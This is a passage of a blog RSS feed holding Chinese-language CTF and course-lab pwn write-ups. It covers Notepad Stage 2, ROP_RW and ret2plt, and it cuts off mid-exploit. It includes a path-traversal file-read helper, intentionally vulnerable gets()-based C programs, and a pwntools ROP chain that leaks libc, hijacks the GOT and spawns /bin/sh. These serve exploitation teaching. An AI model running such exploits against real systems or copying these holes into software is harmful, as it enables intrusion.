The container will be destroy at 5 minutes. So you should debug your exploit in your environment.&lt;/p></description></item><item><title>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/</guid><description>&lt;h1 id="simple-pwn-0x322023-hw---notepad-stage-2">
 Simple PWN 0x32(2023 HW - Notepad-Stage 2)
 &lt;a class="anchor" href="#simple-pwn-0x322023-hw---notepad-stage-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Try to get /flag_backend.&lt;/p>
&lt;p>Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal.
Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>:::success
Special Thanks @cs-otaku For the most of the Inspiration of the WP
:::&lt;/p>
&lt;ul>
&lt;li>Recap
在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_any_file&lt;/span>(file_name):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;../../../../../../&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#ae81ff">89&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(file_name)) &lt;span style="color:#f92672">+&lt;/span> file_name
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#66d9ef">True&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> dealing_cmd(r, &lt;span style="color:#ae81ff">5&lt;/span>, payload, offset&lt;span style="color:#f92672">=&lt;/span>str(offset)&lt;span style="color:#f92672">.&lt;/span>encode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print(ret, len(ret))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ret &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Read note failed.&amp;#39;&lt;/span> &lt;span style="color:#f92672">and&lt;/span> ret &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t open the file.&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">+=&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>success(res)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>==漏洞發想==
透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下&lt;a href="http://blog.coderhuo.tech/2017/10/12/Virtual_Memory_C_strings_proc/">虛擬內存探究 &amp;ndash; 第一篇:C strings &amp;amp; /proc&lt;/a>，要做的事情和我們的幾乎一樣，簡單說就是&lt;/p></description></item><item><title>Simple PWN 0x33(2023 Lab - ROP_RW)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/</guid><description>&lt;h1 id="simple-pwn-0x332023-lab---rop_rw">
 Simple PWN 0x33(2023 Lab - ROP_RW)
 &lt;a class="anchor" href="#simple-pwn-0x332023-lab---rop_rw">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP chain&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> flag[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> empty_buf[&lt;span style="color:#ae81ff">0x30&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">check&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>input)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> pass[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> output[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pass)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)input)[i] &lt;span style="color:#f92672">^&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(pass, &lt;span style="color:#e6db74">&amp;#34;kyoumokawaii&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)output)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">^&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pass)[i];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;flag = %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, output);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, _IONBF, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/home/chal/flag.txt&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, flag, &lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	close(fd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/dev/urandom&amp;#34;&lt;/span>, O_RDONLY);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(fd, &lt;span style="color:#f92672">&amp;amp;&lt;/span>secret, &lt;span style="color:#66d9ef">sizeof&lt;/span>(secret));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">=&lt;/span> ((&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)flag)[i] &lt;span style="color:#f92672">^&lt;/span> secret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;secret = %lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, secret);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	gets(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x34 (2023 Lab - ret2plt)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/</guid><description>&lt;h1 id="simple-pwn-0x34-2023-lab---ret2plt">
 Simple PWN 0x34 (2023 Lab - ret2plt)
 &lt;a class="anchor" href="#simple-pwn-0x34-2023-lab---ret2plt">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Got Hijack / BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">2&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Try your best :&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	gets(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;boom !&amp;#34;&lt;/span>);	
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>checksec + file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: No RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: No canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chal: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>SYSV&lt;span style="color:#f92672">)&lt;/span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>f7ed984819a3908eff455bfcf87716d0fb298fac, &lt;span style="color:#66d9ef">for&lt;/span> GNU/Linux 3.2.0, not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去&lt;/li>
&lt;li>還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
流程:&lt;/li>
&lt;li>首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==
&lt;pre tabindex="0">&lt;code>pop rdi ret
puts got address
puts plt
&lt;/code>&lt;/pre>這三行的意思是把puts的got address，透過puts印出來給我們 -&amp;gt; puts(put自己的got address)&lt;/li>
&lt;li>有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># leak puts got address to calculate libc base address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#f92672">=&lt;/span> u64(r&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">6&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> puts_addr &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有&lt;code>/bin/sh&lt;/code>或是&lt;code>/sh&lt;/code>的string，不過我們可以直接用同樣的方法，把字串送進去
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fetch user input -&amp;gt; /bin/sh\x00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt,
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時他就會像使用者要輸入，並把我們的輸入丟到bss address&lt;/li>
&lt;li>另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># fetch user input -&amp;gt; system address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_got
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address&lt;/li>
&lt;li>所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># system(&amp;#39;/bin/sh\x00&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_plt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="exploit---ret2pltleak-base-address--got-hijackcall-system">
 Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
 &lt;a class="anchor" href="#exploit---ret2pltleak-base-address--got-hijackcall-system">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./chal&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># r = remote(&amp;#39;10.113.184.121&amp;#39;, 10053)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401263&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_got &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403368&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_plt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401070&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_got &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403378&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets_plt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401090&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x403f00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>payload &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># leak puts got address to calculate libc base address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, puts_got,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fetch user input -&amp;gt; /bin/sh\x00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gets_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fetch user input -&amp;gt; system address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, puts_got,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gets_plt,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># system(&amp;#39;/bin/sh\x00&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts_plt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input()
